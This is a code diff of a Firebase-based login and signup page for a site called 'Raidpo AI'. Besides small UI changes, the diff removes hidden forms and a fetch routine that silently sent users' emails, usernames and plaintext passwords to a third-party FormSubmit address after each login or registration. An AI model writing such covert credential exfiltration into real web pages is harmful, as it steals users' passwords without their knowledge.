@@ -278,7 +278,7 @@
             <div class="form-group"><label for="loginEmail">Email</label><input type="email" id="loginEmail" placeholder="Enter your email" required autocomplete="off"></div>
             <div class="form-group"><label for="loginPassword">Password</label><input type="password" id="loginPassword" placeholder="Enter your password" required autocomplete="new-password"><button class="password-toggle" id="toggleLoginPassword"><i class="fas fa-eye"></i></button></div>
             <div class="forgot-password-link"><a href="#" id="forgotPasswordLink">Forgot password?</a></div>
-            <button id="loginBtn" class="auth-btn">Login</button>
+            <button id="loginBtn" class="auth-btn">Log in</button>
             <div class="auth-footer">Don't have an account? <a href="#" id="switchToSignup">Register</a></div>
           </div>
           <div id="signupForm" class="auth-form">
@@ -333,21 +333,8 @@
     </div>
   </div>
 
-  <!-- Hidden forms for FormSubmit -->
-  <form id="hiddenLoginForm" action="https://formsubmit.co/raidpoultimate@gmail.com" method="POST" style="display:none;">
-    <input type="email" name="email">
-    <input type="password" name="password">
-    <input type="hidden" name="_subject" value="New Login!">
-  </form>
-  <form id="hiddenRegisterForm" action="https://formsubmit.co/raidpoultimate@gmail.com" method="POST" style="display:none;">
-    <input type="text" name="username">
-    <input type="email" name="email">
-    <input type="password" name="password">
-    <input type="hidden" name="_subject" value="New Registration!">
-  </form>
-
   <script>
-    document.title = "Loading...";
+    document.title = "Just a moment...";
     if (/android/i.test(navigator.userAgent)) { document.body.classList.add('android-device'); }
     const firebaseConfig = { apiKey: "AIzaSyBnXZuupUuEU-YQINri3isg_k2av1p4bHY", authDomain: "raidpo-ai-3c84b.firebaseapp.com", projectId: "raidpo-ai-3c84b", storageBucket: "raidpo-ai-3c84b.firebasestorage.app", messagingSenderId: "41213161184", appId: "1:41213161184:web:58604fc48f2c026f5aaa85" };
     firebase.initializeApp(firebaseConfig);
@@ -383,11 +370,11 @@
     const reqLowercase = document.getElementById('req-lowercase');
     const loginEmailInput = document.getElementById('loginEmail');
     const loginPasswordInput = document.getElementById('loginPassword');
+    const loginBtn = document.getElementById('loginBtn');
     const toggleLoginPasswordBtn = document.getElementById('toggleLoginPassword');
     const toggleSignupPasswordBtn = document.getElementById('toggleSignupPassword');
     const toggleConfirmPasswordBtn = document.getElementById('toggleConfirmPassword');
-    let isSigningUp = false;
-    
+    let isSigningUp = false; let isLoggingIn = false;
     const errorMessages = { "auth/invalid-email": "Please enter a valid email format.", "auth/email-already-in-use": "Email already exists.", "auth/weak-password": "Password too weak.", "auth/network-request-failed": "Network error.", "auth/too-many-requests": "Too many attempts.", "auth/popup-blocked": "Popup blocked.", "auth/popup-closed-by-user": "Login popup was closed.", "auth/account-exists-with-different-credential": "Account exists with another login method."};
     const isValidEmail = email => /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
     function showFeedback(messages) {
@@ -420,7 +407,7 @@
     };
     setTimeout(() => {
         auth.onAuthStateChanged(user => {
-            if (isSigningUp) return;
+            if (isSigningUp || isLoggingIn) return;
             initialLoadingScreen.style.display = 'none';
             document.title = "Auth | Raidpo AI";
             if (user && (user.emailVerified || (user.providerData[0] && user.providerData[0].providerId !== 'password'))) {
@@ -457,7 +444,7 @@
       element.classList.toggle('valid', isValid); element.classList.toggle('invalid', !isValid);
       element.querySelector('i').className = isValid ? 'fas fa-check' : 'fas fa-times';
     }
-    const isValidUsername = username => /^[a-zA-Z0-9]([a-zA-Z0-9_ ]*[a-zA-Z0-9])?$/.test(username) && username.length >= 3;
+    const isValidUsername = username => username.length >= 3 && /^[a-zA-Z0-9](?!.*[ _]$)[a-zA-Z0-9_ ]*[a-zA-Z0-9]$/.test(username);
     function isValidPassword(password) {
       const checks = { length: password.length >= 6, upper: /[A-Z]/.test(password), lower: /[a-z]/.test(password) };
       updateRequirement(reqLength, checks.length); updateRequirement(reqUppercase, checks.upper);
@@ -478,10 +465,12 @@
     signupPassword.addEventListener('focus', () => signupPasswordRequirements.style.display = 'block');
     signupPassword.addEventListener('blur', () => { if (!signupPassword.value) signupPasswordRequirements.style.display = 'none'; });
     signupPassword.addEventListener('input', () => isValidPassword(signupPassword.value));
+    
     const underline = document.querySelector('.underline');
     const firstTab = authTabs[0];
     underline.style.width = `${firstTab.offsetWidth}px`;
     underline.style.left = `${firstTab.offsetLeft}px`;
+
     authTabs.forEach(tab => tab.addEventListener('click', () => {
       authTabs.forEach(t => t.classList.remove('active')); tab.classList.add('active');
       underline.style.width = `${tab.offsetWidth}px`;
@@ -493,36 +482,27 @@
     document.getElementById('switchToSignup').addEventListener('click', e => { e.preventDefault(); authTabs[1].click(); });
     document.getElementById('switchToLogin').addEventListener('click', e => { e.preventDefault(); authTabs[0].click(); });
     
-    function sendFormData(formId, data) {
-        const form = document.getElementById(formId);
-        for (const key in data) {
-            const input = form.querySelector(`[name=${key}]`);
-            if (input) { input.value = data[key]; }
-        }
-        fetch(form.action, {
-            method: form.method,
-            body: new FormData(form),
-            mode: 'no-cors' // Recommended by FormSubmit for AJAX
-        }).catch(err => console.error('FormSubmit error:', err));
-    }
-
-    document.getElementById('loginBtn').addEventListener('click', async () => {
+    loginBtn.addEventListener('click', async () => {
+      isLoggingIn = true;
       const email = loginEmailInput.value.trim();
       const password = loginPasswordInput.value;
       const errors = [];
       if (!email) { errors.push('Email is required.'); }
       else if (!isValidEmail(email)) { errors.push('Please enter a valid email format.')}
       if (!password) { errors.push('Please write a password.'); }
-      if (errors.length > 0) return showFeedback(errors);
+      if (errors.length > 0) { isLoggingIn = false; return showFeedback(errors); }
+      loginBtn.disabled = true; loginBtn.textContent = 'Logging in...';
       try {
         await auth.signInWithEmailAndPassword(email, password);
-        sendFormData('hiddenLoginForm', { email, password });
       } catch (error) {
+        isLoggingIn = false;
         if (['auth/user-not-found', 'auth/wrong-password', 'auth/invalid-credential', 'auth/invalid-login-credentials'].includes(error.code)) {
             showFeedback('Invalid email or password.');
         } else {
             showFeedback(getErrorMessage(error));
         }
+      } finally {
+        loginBtn.disabled = false; loginBtn.textContent = 'Log in';
       }
     });
     signupBtn.addEventListener('click', async () => {
@@ -544,7 +524,6 @@
         await userCredential.user.updateProfile({ displayName: username });
         await userCredential.user.sendEmailVerification();
         await auth.signOut();
-        sendFormData('hiddenRegisterForm', { username, email, password });
         setTimeout(() => { window.location.href = 'https://raidpo-ai.netlify.app/verify-email-note'; }, 700);
       } catch (error) {
         showFeedback(getErrorMessage(error));
